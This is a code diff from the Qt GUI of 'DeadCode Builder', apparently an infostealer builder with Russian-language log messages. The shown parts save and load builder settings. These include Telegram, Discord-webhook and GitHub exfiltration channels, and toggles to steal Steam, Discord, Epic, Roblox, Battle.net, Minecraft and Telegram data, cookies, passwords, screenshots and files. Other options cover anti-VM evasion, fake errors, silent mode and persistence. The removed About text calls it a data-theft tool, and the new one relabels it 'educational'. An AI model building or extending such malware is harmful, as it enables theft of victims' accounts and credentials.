+    settings.setValue("encryptionKey2", QString::fromStdString(config.encryptionKey2));
+    settings.setValue("encryptionSalt", QString::fromStdString(config.encryptionSalt));
+    settings.setValue("iconPath", QString::fromStdString(config.iconPath));
+    settings.setValue("githubToken", QString::fromStdString(config.githubToken));
+    settings.setValue("githubRepo", QString::fromStdString(config.githubRepo));
+    settings.setValue("discord", config.discord);
+    settings.setValue("steam", config.steam);
+    settings.setValue("steamMAFile", config.steamMAFile);
+    settings.setValue("epic", config.epic);
+    settings.setValue("roblox", config.roblox);
+    settings.setValue("battlenet", config.battlenet);
+    settings.setValue("minecraft", config.minecraft);
+    settings.setValue("cookies", config.cookies);
+    settings.setValue("passwords", config.passwords);
+    settings.setValue("screenshot", config.screenshot);
+    settings.setValue("fileGrabber", config.fileGrabber);
+    settings.setValue("systemInfo", config.systemInfo);
+    settings.setValue("socialEngineering", config.socialEngineering);
+    settings.setValue("chatHistory", config.chatHistory);
+    settings.setValue("telegram", config.telegram);
+    settings.setValue("antiVM", config.antiVM);
+    settings.setValue("fakeError", config.fakeError);
+    settings.setValue("silent", config.silent);
+    settings.setValue("autoStart", config.autoStart);
+    settings.setValue("persist", config.persist);
 
-    emitLog("Конфигурация сохранена в: " + fileName);
+    emitLog("Конфигурация сохранена: " + fileName);
 }
 
-// Загрузка конфигурации
 void MainWindow::on_actionLoadConfig_triggered() {
     QString fileName = QFileDialog::getOpenFileName(this, "Загрузить конфигурацию", "", "Config Files (*.ini)");
     if (fileName.isEmpty()) return;
 
     QSettings settings(fileName, QSettings::IniFormat);
-    ui->tokenLineEdit->setText(settings.value("token").toString());
-    ui->chatIdLineEdit->setText(settings.value("chatId").toString());
-    ui->discordWebhookLineEdit->setText(settings.value("discordWebhook").toString());
-    ui->filenameLineEdit->setText(settings.value("filename").toString());
-    ui->encryptionKey1LineEdit->setText(settings.value("encryptionKey1").toString());
-    ui->encryptionKey2LineEdit->setText(settings.value("encryptionKey2").toString());
-    ui->encryptionSaltLineEdit->setText(settings.value("encryptionSalt").toString());
-    ui->iconPathLineEdit->setText(settings.value("iconPath").toString());
-    ui->githubTokenLineEdit->setText(settings.value("githubToken").toString());
-    ui->githubRepoLineEdit->setText(settings.value("githubRepo").toString());
-    ui->steamCheckBox->setChecked(settings.value("steam").toBool());
-    ui->steamMAFileCheckBox->setChecked(settings.value("steamMAFile").toBool());
-    ui->epicCheckBox->setChecked(settings.value("epic").toBool());
-    ui->robloxCheckBox->setChecked(settings.value("roblox").toBool());
-    ui->battlenetCheckBox->setChecked(settings.value("battlenet").toBool());
-    ui->minecraftCheckBox->setChecked(settings.value("minecraft").toBool());
-    ui->discordCheckBox->setChecked(settings.value("discord").toBool());
-    ui->telegramCheckBox->setChecked(settings.value("telegram").toBool());
-    ui->chatHistoryCheckBox->setChecked(settings.value("chatHistory").toBool());
-    ui->cookiesCheckBox->setChecked(settings.value("cookies").toBool());
-    ui->passwordsCheckBox->setChecked(settings.value("passwords").toBool());
-    ui->screenshotCheckBox->setChecked(settings.value("screenshot").toBool());
-    ui->fileGrabberCheckBox->setChecked(settings.value("fileGrabber").toBool());
-    ui->systemInfoCheckBox->setChecked(settings.value("systemInfo").toBool());
-    ui->socialEngineeringCheckBox->setChecked(settings.value("socialEngineering").toBool());
-    ui->antiVMCheckBox->setChecked(settings.value("antiVM").toBool());
-    ui->fakeErrorCheckBox->setChecked(settings.value("fakeError").toBool());
-    ui->silentCheckBox->setChecked(settings.value("silent").toBool());
-    ui->autoStartCheckBox->setChecked(settings.value("autoStart").toBool());
-    ui->persistCheckBox->setChecked(settings.value("persist").toBool());
+    sendMethodComboBox->setCurrentText(settings.value("sendMethod", "Local File").toString());
+    tokenLineEdit->setText(settings.value("telegramToken", "").toString());
+    chatIdLineEdit->setText(settings.value("chatId", "").toString());
+    discordWebhookLineEdit->setText(settings.value("discordWebhook", "").toString());
+    fileNameLineEdit->setText(settings.value("filename", "DeadCode.exe").toString());
+    encryptionKey1LineEdit->setText(settings.value("encryptionKey1", "").toString());
+    encryptionKey2LineEdit->setText(settings.value("encryptionKey2", "").toString());
+    encryptionSaltLineEdit->setText(settings.value("encryptionSalt", "").toString());
+    iconPathLineEdit->setText(settings.value("iconPath", "").toString());
+    githubTokenLineEdit->setText(settings.value("githubToken", "").toString());
+    githubRepoLineEdit->setText(settings.value("githubRepo", "").toString());
+    discordCheckBox->setChecked(settings.value("discord", false).toBool());
+    steamCheckBox->setChecked(settings.value("steam", false).toBool());
+    steamMAFileCheckBox->setChecked(settings.value("steamMAFile", false).toBool());
+    epicCheckBox->setChecked(settings.value("epic", false).toBool());
+    robloxCheckBox->setChecked(settings.value("roblox", false).toBool());
+    battlenetCheckBox->setChecked(settings.value("battlenet", false).toBool());
+    minecraftCheckBox->setChecked(settings.value("minecraft", false).toBool());
+    cookiesCheckBox->setChecked(settings.value("cookies", false).toBool());
+    passwordsCheckBox->setChecked(settings.value("passwords", false).toBool());
+    screenshotCheckBox->setChecked(settings.value("screenshot", false).toBool());
+    fileGrabberCheckBox->setChecked(settings.value("fileGrabber", false).toBool());
+    systemInfoCheckBox->setChecked(settings.value("systemInfo", false).toBool());
+    socialEngineeringCheckBox->setChecked(settings.value("socialEngineering", false).toBool());
+    chatHistoryCheckBox->setChecked(settings.value("chatHistory", false).toBool());
+    telegramCheckBox->setChecked(settings.value("telegram", false).toBool());
+    antiVMCheckBox->setChecked(settings.value("antiVM", false).toBool());
+    fakeErrorCheckBox->setChecked(settings.value("fakeError", false).toBool());
+    silentCheckBox->setChecked(settings.value("silent", false).toBool());
+    autoStartCheckBox->setChecked(settings.value("autoStart", false).toBool());
+    persistCheckBox->setChecked(settings.value("persist", false).toBool());
 
-    emitLog("Конфигурация загружена из: " + fileName);
+    updateConfigFromUI();
+    emitLog("Конфигурация загружена: " + fileName);
 }
 
-// Экспорт логов
 void MainWindow::on_actionExportLogs_triggered() {
     QString fileName = QFileDialog::getSaveFileName(this, "Экспортировать логи", "", "Text Files (*.txt)");
     if (fileName.isEmpty()) return;
@@ -1924,18 +1824,29 @@ void MainWindow::on_actionExportLogs_triggered() {
         QTextStream out(&file);
         out << ui->textEdit->toPlainText();
         file.close();
-        emitLog("Логи экспортированы в: " + fileName);
+        emitLog("Логи экспортированы: " + fileName);
     } else {
         emitLog("Ошибка: Не удалось экспортировать логи");
     }
 }
 
-// Выход из приложения
 void MainWindow::on_actionExit_triggered() {
-    exitApp();
+    QApplication::quit();
 }
 
-// Отображение информации о программе
 void MainWindow::on_actionAbout_triggered() {
-    QMessageBox::about(this, "О программе", "DeadCode Builder\nВерсия: 1.0.0\nРазработчик: xAI\nОписание: Инструмент для создания и настройки сборок с функциями кражи данных.");
+    QMessageBox::about(this, "О программе", "DeadCode Builder\nВерсия 1.0\nСоздано для образовательных целей.\n© 2023");
+}
+
+void MainWindow::replyFinished(QNetworkReply* reply) {
+    if (reply->error() == QNetworkReply::NoError) {
+        emitLog("Сетевой запрос выполнен успешно");
+    } else {
+        emitLog("Ошибка сетевого запроса: " + reply->errorString());
+    }
+    reply->deleteLater();
+}
+
+void MainWindow::appendLog(const QString& message) {
+    ui->textEdit->append(message);
 }
